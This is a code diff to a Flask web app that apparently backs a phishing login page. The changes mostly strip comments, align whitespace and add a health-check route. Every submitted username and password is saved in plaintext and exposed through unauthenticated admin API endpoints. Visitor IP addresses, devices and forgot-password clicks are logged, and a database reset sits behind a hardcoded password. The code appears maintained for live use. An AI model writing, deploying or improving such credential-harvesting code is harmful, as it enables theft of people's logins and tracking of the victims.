@@ -6,7 +6,7 @@ app = Flask(__name__)
 DB_PATH = "login_credentials.db"
 
 # ─────────────────────────────────────────────────────────────
-#  DATABASE SETUP
+# DATABASE SETUP
 # ─────────────────────────────────────────────────────────────
 def get_db():
     conn = sqlite3.connect(DB_PATH)
@@ -17,7 +17,6 @@ def init_db():
     conn = get_db()
     c = conn.cursor()
 
-    # Legacy table — kept for backward compatibility
     c.execute("""
         CREATE TABLE IF NOT EXISTS users (
             username TEXT PRIMARY KEY,
@@ -25,31 +24,28 @@ def init_db():
         )
     """)
 
-    # SECTION 1: Login Details — every submit gets its own row
     c.execute("""
         CREATE TABLE IF NOT EXISTS login_details (
-            id            INTEGER PRIMARY KEY AUTOINCREMENT,
-            username      TEXT NOT NULL,
-            password      TEXT NOT NULL,
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT NOT NULL,
+            password TEXT NOT NULL,
             submitted_time TEXT NOT NULL
         )
     """)
 
-    # SECTION 2: Visitor Logs — every page visit gets its own row
     c.execute("""
         CREATE TABLE IF NOT EXISTS visits (
-            id          INTEGER PRIMARY KEY AUTOINCREMENT,
-            ip_address  TEXT NOT NULL,
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip_address TEXT NOT NULL,
             device_info TEXT NOT NULL,
-            visit_time  TEXT NOT NULL
+            visit_time TEXT NOT NULL
         )
     """)
 
-    # SECTION 3: Forgot Password Logs — every click gets its own row
     c.execute("""
         CREATE TABLE IF NOT EXISTS forgot_password_logs (
-            id          INTEGER PRIMARY KEY AUTOINCREMENT,
-            ip_address  TEXT NOT NULL,
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip_address TEXT NOT NULL,
             device_info TEXT NOT NULL,
             clicked_time TEXT NOT NULL
         )
@@ -61,7 +57,7 @@ def init_db():
 init_db()
 
 # ─────────────────────────────────────────────────────────────
-#  STATIC FILE ROUTES
+# STATIC FILE ROUTES
 # ─────────────────────────────────────────────────────────────
 @app.route("/style.css")
 def css():
@@ -72,18 +68,24 @@ def js():
     return send_from_directory(".", "script.js")
 
 # ─────────────────────────────────────────────────────────────
-#  HOMEPAGE — logs every visit automatically
+# HEALTH CHECK ROUTE (FOR UPTIMEROBOT)
+# ─────────────────────────────────────────────────────────────
+@app.route("/health")
+def health():
+    return "OK", 200
+
+# ─────────────────────────────────────────────────────────────
+# HOMEPAGE — logs real visits only
 # ─────────────────────────────────────────────────────────────
 @app.route("/")
 def home():
     try:
-        # Support proxies / Render's load balancer
         ip = request.headers.get("X-Forwarded-For", request.remote_addr)
         if ip and "," in ip:
             ip = ip.split(",")[0].strip()
 
-        device      = request.user_agent.string or "Unknown"
-        visit_time  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        device = request.user_agent.string or "Unknown"
+        visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
         conn = get_db()
         conn.execute(
@@ -93,30 +95,28 @@ def home():
         conn.commit()
         conn.close()
     except Exception:
-        pass  # never crash the main page due to logging
+        pass
 
     return send_from_directory(".", "index.html")
 
 # ─────────────────────────────────────────────────────────────
-#  SAVE LOGIN — stores credential in both tables
+# SAVE LOGIN
 # ─────────────────────────────────────────────────────────────
 @app.route("/save-login", methods=["POST"])
 def save_login():
     try:
-        data           = request.get_json()
-        username       = data["username"]
-        password       = data["password"]
+        data = request.get_json()
+        username = data["username"]
+        password = data["password"]
         submitted_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
         conn = get_db()
 
-        # New detailed log (all submissions, newest first)
         conn.execute(
             "INSERT INTO login_details (username, password, submitted_time) VALUES (?, ?, ?)",
             (username, password, submitted_time)
         )
 
-        # Legacy users table (upsert, keeps one row per username)
         conn.execute(
             "INSERT OR REPLACE INTO users (username, password) VALUES (?, ?)",
             (username, password)
@@ -129,13 +129,12 @@ def save_login():
         return jsonify({"success": False, "error": str(e)}), 500
 
 # ─────────────────────────────────────────────────────────────
-#  ADMIN DASHBOARD
+# ADMIN DASHBOARD
 # ─────────────────────────────────────────────────────────────
 @app.route("/admin")
 def admin():
     return send_from_directory(".", "admin.html")
 
-# Legacy endpoint — kept for compatibility
 @app.route("/api/credentials")
 def get_credentials():
     conn = get_db()
@@ -143,7 +142,6 @@ def get_credentials():
     conn.close()
     return jsonify([{"username": r[0], "password": r[1]} for r in rows])
 
-# Section 1: login details (newest first)
 @app.route("/api/login-details")
 def get_login_details():
     conn = get_db()
@@ -156,7 +154,6 @@ def get_login_details():
         for r in rows
     ])
 
-# Section 2: visitor logs (newest first)
 @app.route("/api/visits")
 def get_visits():
     conn = get_db()
@@ -169,7 +166,6 @@ def get_visits():
         for r in rows
     ])
 
-# Section 3: forgot password logs (newest first)
 @app.route("/api/forgot-logs")
 def get_forgot_logs():
     conn = get_db()
@@ -182,14 +178,14 @@ def get_forgot_logs():
         for r in rows
     ])
 
-# Log a forgot-password link click
 @app.route("/log-forgot", methods=["POST"])
 def log_forgot():
     try:
         ip = request.headers.get("X-Forwarded-For", request.remote_addr)
         if ip and "," in ip:
             ip = ip.split(",")[0].strip()
-        device       = request.user_agent.string or "Unknown"
+
+        device = request.user_agent.string or "Unknown"
         clicked_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
         conn = get_db()
@@ -204,7 +200,7 @@ def log_forgot():
         return jsonify({"success": False, "error": str(e)}), 500
 
 # ─────────────────────────────────────────────────────────────
-#  RESET DATABASE
+# RESET DATABASE
 # ─────────────────────────────────────────────────────────────
 @app.route("/reset-db", methods=["POST"])
 def reset_db():
@@ -212,19 +208,17 @@ def reset_db():
         data = request.get_json()
         if data.get("password") != "564938":
             return jsonify({"success": False, "error": "Invalid password"}), 403
-            
+
         conn = get_db()
-        # Clear all tables
         conn.execute("DELETE FROM login_details")
         conn.execute("DELETE FROM users")
         conn.execute("DELETE FROM visits")
         conn.execute("DELETE FROM forgot_password_logs")
-        
-        # Reset sqlite_sequence to reset autoincrement ids
+
         conn.execute("DELETE FROM sqlite_sequence WHERE name='login_details'")
         conn.execute("DELETE FROM sqlite_sequence WHERE name='visits'")
         conn.execute("DELETE FROM sqlite_sequence WHERE name='forgot_password_logs'")
-        
+
         conn.commit()
         conn.close()
         return jsonify({"success": True})
